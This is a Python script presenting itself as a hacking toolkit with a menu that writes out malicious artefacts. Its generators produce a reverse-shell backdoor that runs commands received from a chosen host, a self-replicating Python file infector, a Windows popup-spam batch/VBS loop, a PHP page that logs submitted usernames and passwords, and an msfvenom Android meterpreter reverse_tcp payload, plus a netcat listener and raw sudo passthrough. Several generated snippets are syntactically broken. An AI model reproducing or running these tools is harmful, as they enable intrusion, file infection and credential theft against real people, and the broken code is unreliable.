message = """
           ||||||||||||,,
           |WWWWWWWWW|W|||,
           |_________|~WWW||,
            ~-_      ~_  ~WW||,
            __-~---__/ ~_  ~WW|,
        _-~~         ~~-_~_  ~W
  _--~~~~~~~~~~___       ~-~_/
 -                ~~~--_   ~_
|                       ~_   |
|   ____-------___        -_  |
|-~~              ~~--_     - |
 ~| ~--___________     |-_   ~_
   | \`~'/  \`~'_-~~  |  |~-_-
  _-~_~~~    ~~~   _-~  |  |
 ---.--__         ---.-~  |
 | |    -~~-----~~| |    -
 |_|__-~          |_|__-~
 
 =_=
"""
print(message)

from os import *
from sys import exit
import os
import socket,subprocess as sp, sys
from random import randint
import urllib
import sys
import requests


def help():
		print (" _   _      _")
		print ("| | | | ___| |_ __")
		print ("| |_| |/ _ \ | '_ \|")
		print ("|  _  |  __/ | |_) |")
		print ("|_| |_|\___|_| .__/")
		print ("#ex# exit")
		print ("#sil# clean to screen")
		print ("#list# list to directory")
		print ("#go to# go to your selected folder")
		print ("#make# make simple programs")
		print ("     |___>#make --spam _win# windows spam virus")
		print ("     |___>#make --infection _python# python infection virus")
		print ("     |___>#make --backdoor _python# python backdoor exploit")
		print ("     |___>#make --phishing _php# php fishing file")
		print ("     |___>#make msf# making exploit with metasploit")
		print ("          |___>#make msf --exploit _android")
		print ("#sys# using system code")
		print ("#read# read a file")
		print ("#combine# combine 2 files")
		print ("#kok# root operations")
		print ("    |___>#free# free root acces")
		print ("    |___>#start backdoor# start backdoor")
		print ("    |___>#source web# get website source codes")
		print ("    |___>#sys# using system code")
		print ("    |___>#ex# exit")
def spam_win():
        win = open("spam.bat", "w")
        lf = open("loop.vbs", "w")
        win.write("@echo off\n:while\nstart loop.vbs\ngoto :while")
        lf.write('do\nx=MsgBox("Hacked", 0+46, "It is Black Death Mini")\nloop')
        win.close()
        print ("spam.bat and loop.vbs")
        lf.close()
def backdoor_soft():
	hst = input("\host\_=>")
	print ("port 9120")
	bd = open("backdoor.py", "w")
	bd.write("#!/usr/bin/python/")
	bd.write("import socket,subprocess as sp, sys\n")
	bd.write("host = '"+hst+"'\n")
	bd.write("port = 9120\n")
	bd.write("conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
	bd.write("conn.connect((host,port))\n")
	bd.write("while l:\n")
	bd.write("	commend = str(conn.recv(1024))\n")
	bd.write('	if command != "exit":\n')
	bd.write("		sh = sp.Popen(command,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)\n")
	bd.write("		out, err = sh.communicate()\n")
	bd.write("		result = str(out) + str(err)\n")
	bd.write("		lenght = str(len(result)).zfill(16)\n")
	bd.write("	conn.send(lenght + result)")
	bd.close()
	print ("backdoor.py")
def backdoor_start():
	system("nc -l -p 9120")
def spam_python():
	sp = open("infection.py", "w")
	sp.write("#!/usr/bin/python\n")
	sp.write("#####_Begin_#####\n")
	sp.write("import sys,glob,re\n")
	sp.write("vcd = []\n")
	sp.write('sy = open(sys.argv[0],"r")\n')
	sp.write("lns = sy.readline()\n")
	sp.write("sy.close()\n")
	sp.write("inv = False\n")
	sp.write("for line in lns:\n")
	sp.write("	if (re.search('^#####_Begin_#####', line)): inv = True\n")
	sp.write("	if (inv = True): vcd.append(line)\n")
	sp.write("	if (re.search('^#####_End_#####'): break\n")
	sp.write('prg = glob.glob("*.py")\n')
	sp.write("for prog in prg:\n")
	sp.write('	sy = open(prog,"r"\n')
	sp.write("	pcd = sy.readlined()\n")
	sp.write("	sy.close()\n")
	sp.write("	inf = False\n")
	sp.write("	for line in pcd:\n")
	sp.write("		if ('#####_Begin_#####' in line):\n")
	sp.write("			inf = True\n")
	sp.write("			break\n")
	sp.write("	if not inf:\n")
	sp.write("		ncd = []\n")
	sp.write("		if ('#!' in pcd[0]): ncd.append(pcd.pop(0))\n")
	sp.write("		ncd.extend(vcd)\n")
	sp.write("		ncd.extend(pcd)\n")
	sp.write('		sy = open(prog, "w")\n')
	sp.write("		sy.writelines(ncd)\n")
	sp.write("		sy.close()\n")
	sp.write("print ('Dontt kill me')\n")
	sp.write("#####_End_#####")
	sp.close()
	print ("infection.py")
def source_web(sw):
	r = requests.get(sw)
	index1 = open("index.html", "w")
	index1.write(r.text)
	index1.close()
	print ("index.html has been builded")
def reader():
	fn = input("\enter the file name\_=>")
	fr = open(fn, "r")
	print(fr.read())
	fr.close()
def combine():
	f1 = input("\enter first file name\_=>")
	f2 = input("\enter second file name\_=>")
	f3 = input("\enter new file name\_=>")
	system("cat "+f1+" "+f2+" > "+ f3)
def log_page():
	un = input("\enter username varaible\_=>")
	pw = input("\enter password varaible\_=>")
	ff = open("index.php", "w")
	ff.write("<?php\n")
	ff.write("	if($_POST){\n")
	ff.write("		$file = fopen('")
	ff.write(fn+"',")
	ff.write('"w");\n')
	ff.write("		$user = $_POST['")
	ff.write(un+"'];\n")
	ff.write("		$pass = $_POST"+"['")
	ff.write(pw+"'];\n")
	ff.write("		fwrite($file, 'username:');\n")
	ff.write("		fwrite($file, $user);\n")
	ff.write("		fwrite($file, 'password:');\n")
	ff.write("		fwrite($file, $pass);\n")
	ff.write("		fclose($file);\n")
	ff.write("	}\n")
	ff.write("?>\n")
	ff.close()
	print("index.php")
def notepad():
	fn = input("\enter the file name\_=>")
	nb = True
	nf = open(fn, "w")
	while nb == True:
		note = input(">")
		nf.write(note)
		if note == "ex":
			nb = False
			nf.close()
def msf(m):
	if m == "android":
		ip = input("lhost:")
		port = input("lport:")
		apk = input("exploit name:")
		system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" R > "+apk)
def kok():
	kcd = "\#\___>"
	while True:
		kcode = input(kcd)
		if kcode == "free":
			fre = input("#")
			system("sudo "+fre)
		elif kcode == "ex":
			menu()
		elif kcode == "info":
			system("uname -a")
		elif kcode == "start backdoor":
			backdoor_start()
		elif kcode == "source web":
			wi = input("\enter the url\_=>")
			source_web(wi)
		elif kcode == "help":
			help()
		else:
			print(kcd+" not found")
us = sys.argv[0:]
def menu():
	name = "\___>"
	aut = False
	while True:
		code = input(name)
		if code == "kok":
			aut = True
		elif code == "help":
			help()
		elif code == "ex":
			exit()
		elif code == "make --backdoor _python":
			backdoor_soft()
		elif code == "make --infection _python":
			spam_python()
		elif code == "make --spam _win":
                        spam_win()
		elif code == "make --phishing _php":
			log_page()
		elif code == "combine":
			combine()
		elif code == "read":
			reader()
		elif code == "list":
			system("ls")
		elif code == "sil":
			system("clear")
		elif code == "note":
			notepad()
		elif code == "sys":
			sys_c = input("system code")
			system(sys_c)
		elif code == "go to":
			chd = input("folder:")
			chdir(chd)
		elif code == "make msf --exploit _android":
			msf("android")
		else:
			print(code+" not found")
		if aut == True:
			kok()
if __name__ == '__main__':
	menu()